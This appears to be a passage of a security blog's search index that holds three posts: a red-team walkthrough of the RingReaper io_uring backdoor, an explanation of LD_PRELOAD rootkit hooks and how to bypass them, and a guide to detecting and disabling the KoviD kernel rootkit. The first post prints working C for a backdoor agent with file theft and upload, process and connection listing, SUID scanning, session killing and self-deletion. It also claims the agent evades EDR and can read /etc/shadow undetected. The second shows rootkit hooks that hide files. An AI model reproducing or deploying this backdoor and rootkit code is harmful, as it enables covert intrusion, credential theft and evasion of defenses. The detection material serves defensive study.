against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: 